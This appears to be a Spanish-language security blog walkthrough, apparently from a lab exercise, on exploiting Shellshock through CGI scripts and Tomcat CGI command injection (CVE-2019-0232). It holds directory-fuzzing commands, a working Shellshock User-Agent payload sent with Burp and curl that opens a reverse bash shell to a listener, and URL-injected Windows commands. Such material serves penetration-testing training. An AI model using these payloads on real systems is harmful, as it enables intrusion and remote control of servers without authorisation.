---
date: 2022-05-19T01:40:05.000Z
layout: post
comments: true
title: Ataque Shellshock
subtitle: 'a través de cgi'
description: >-
image: >-
    /images/shellshocklogo.png
optimized_image: >-
    /images/shellshocklogo.png
category: ciberseguridad
tags: 
  - linux
  - hacking
  - exploit
  - vulnerabilidad
  - cgi-bin
  - tomcat
  - cgi
  - CVE-2019-0232
  - CVE-2014-6271
author: Felipe Canales Cayuqueo
paginate: true
---

El ataque Shellshock es una vulnerabilidad de ejecución remota de comandos, es decir, se basa en una falla de seguridad en el shell Bash (GNU Bash hasta la versión 4.3) que ejecuta incorrectamente los comandos finales cuando importa una definición de función almacenada en una variable de entorno. Para empezar intentaremos reconocer la vulnerabilidad:

* Una manera es observando el código fuente de la página, la cual nos puede entregar pistas sobre el directorio ```cgi-bin```:
  
    [![shellshockvuln](/images/shellshockvuln.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/shellshockvuln.png)

* Otra forma es realizando una enumeración de directorios:

    ```bash
    ┌─[root@kali]─[/shellshock]
    └──╼ffuf -w /usr/share/wordlists/OneListForAll/onelistforallshort.txt -u http://10.129.205.27/FUZZ -k -fc 400,404,414 -t 100 -c 
    
            /'___\  /'___\           /'___\       
           /\ \__/ /\ \__/  __  __  /\ \__/       
           \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
            \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
             \ \_\   \ \_\  \ \____/  \ \_\       
              \/_/    \/_/   \/___/    \/_/       
    
           v2.1.0-dev
    ________________________________________________
    
     :: Method           : GET
     :: URL              : http://10.129.205.27/FUZZ
     :: Wordlist         : FUZZ: /usr/share/wordlists/OneListForAll/onelistforallshort.txt
     :: Follow redirects : false
     :: Calibration      : false
     :: Timeout          : 10
     :: Threads          : 100
     :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
     :: Filter           : Response status: 400,404,414
     :: Filter           : Response size: 10918
    ________________________________________________
    
    icons/small             [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 150ms]
    icons/apache_pb.gif     [Status: 200, Size: 4463, Words: 56, Lines: 26, Duration: 148ms]
    cgi-bin/.htaccess.save  [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 148ms]
    cgi-bin/                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 148ms]
    ```
  
Una vez detectado podemos realizar fuzzing para ver que hay tras el directorio ```cgi-bin``` (en algunos casos el directorio puede ser ```/cgi```) para ello debemos considerar las extensiones ```.cgi```, ```.sh```, ```.pl```, ```.py```, ```.bat```, ```.cmd```, entre otros:

```bash
┌─[root@kali]─[/shellshock]
└──╼ wfuzz -c -t 300 --hc=404,400,403 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w extensions.txt http://10.1.1.26/cgi-bin/FUZZ.FUZ2Z
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.1.1.26/cgi-bin/FUZZ.FUZ2Z
Total requests: 441120

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                             
=====================================================================

000003375:   500        16 L     77 W       607 Ch      "shell - sh"                                        
000003252:   500        16 L     77 W       607 Ch      "backup - cgi"                                      

Total time: 0
Processed Requests: 441120
Filtered Requests: 441118
Requests/sec.: 0
```

Con la herramienta ```ffuf``` se realizaría de la siguiente forma:

```bash
┌──(root㉿nptg)-[/home/…/Documentos/HTB/Academy/CBBH]
└─# ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.129.205.27/cgi-bin/FUZZ -e .cgi,.sh,.bat,.cmd -k -fc 400,404,414 -fs 278 -t 100 -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.205.27/cgi-bin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .cgi .sh .bat .cmd 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 400,404,414
 :: Filter           : Response size: 278
________________________________________________

access.cgi              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 159ms]
```

> El parámetro ```-fs``` se adapta en base a la respuesta de cada web para evitar falsos positivos.

### Verificación de vulnerabilidad

Procedemos a verificar la vulnerabilidad del primer caso (con wfuzz) por medio de nmap, en mi caso voy a ocupar ```shell.sh```, sin embargo podría ocupar ```backup.cgi```, ```admin.cgi```, entre otros que estuvieran disponibles:

```bash
┌─[root@kali]─[/shellshock]
└──╼ nmap 10.1.1.26 -p80 --script=http-shellshock --script-args uri=/cgi-bin/shell.sh
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 01:42 EDT
Nmap scan report for 10.1.1.26
Host is up (0.00041s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       http://seclists.org/oss-sec/2014/q3/685
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271

```

### Explotación por BurpSuite

Para explotarlo podemos realizarlo por medio de ```BurpSuite``` y ```CURL```, iniciaremos con el primero de ellos en donde nos pondremos a la escucha a través de un puerto:

```bash
┌─[root@kali]─[/shellshock]
└──╼ nc -nlvp 1234
```
Ahora interceptaremos peticiones en la dirección que hemos encontrado:

[![bsshellshock](/images/bsshellshock.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/bsshellshock.png)

Y cambiaremos el ```User-Agent``` que se encuentra marcado con el cuadro rojo, por lo siguiente:

```bash
User Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
```
Procedemos a reemplazar y adaptar el ```User-Agent```:

[![shellshockbs](/images/shellshockbs.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/shellshockbs.png)

Le damos a ```Forward```:

```bash
┌─[root@kali]─[/shellshock]
└──╼ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.1.1.19] from (UNKNOWN) [10.1.1.26] 60756
bash: cannot set terminal process group (540): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.3$ whoami
whoami
www-data
bash-4.3$ 
```

Y recibimos respuesta en el puerto que teníamos a la escucha anteriormente.

### Explotación por CURL

Para realizar la explotación por ```CURL``` probaremos ahora ```backup.cgi``` solo para demostrar que también funciona al igual que ```shell.sh```. En este caso nos pondremos también a la escucha:

```bash
┌─[root@kali]─[/shellshock]
└──╼ nc -nlvp 1234
```

Ahora procedemos a realizar lo siguiente por medio de ```CURL``` y nos debería devolver la bash:

```bash
┌─[root@kali]─[/shellshock]
└──╼ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.1.1.19/1234 0>&1' http://10.1.1.26/cgi-bin/backup.cgi

```

Nos va a quedar ejecutándose y el netcat nos respondería con la bash:

```bash
┌─[root@kali]─[/shellshock]
└──╼ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.1.1.19] from (UNKNOWN) [10.1.1.26] 60758
bash: cannot set terminal process group (540): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.3$ whoami
whoami
www-data
bash-4.3$ 
```

Y así es como se explotaría un ataque shellshock.
 
### Tomcat CGI (CVE-2019-0232)

Cuando se ejecuta en Windows con la opción enableCmdLineArguments habilitada, el CGI Servlet de Apache Tomcat (versiones 9.0.0.M1 a 9.0.17, 8.5.0 a 8.5.39 y 7.0.0 a 7.0.93) es vulnerable a ejecución remota de código (RCE) debido a un error en la forma en que la JRE pasa los argumentos de línea de comandos al sistema operativo Windows.

Por defecto, el CGI Servlet se encuentra deshabilitado, y la opción enableCmdLineArguments también está desactivada de manera predeterminada en Tomcat 9.0.x (y se deshabilitará por defecto en todas las versiones como medida de mitigación ante esta vulnerabilidad).

El servlet CGI es un componente vital de Apache Tomcat que permite que los servidores web se comuniquen con aplicaciones externas más allá de la JVM de Tomcat. Estas aplicaciones externas suelen ser scripts CGI escritos en lenguajes como Perl, Python o Bash. El servlet CGI recibe solicitudes de navegadores web y las reenvía a scripts CGI para su procesamiento.

Entonces si tenemos la siguiente URL:

```
http://10.129.204.227:8080/cgi/welcome.bat
```

Podremos inyectar comandos comandos como:

```
http://10.129.204.227:8080/cgi/welcome.bat?&dir
```

También se puede recuperar una lista de las variables ambientales:

```
http://10.129.204.227:8080/cgi/welcome.bat?&set
```

Para ejecutar por ejemplo ```whoami.exe``` es necesario el uso de URL encode por los caracteres especiales.

```
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

> La URL de arriba sin codificar quedaría http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe

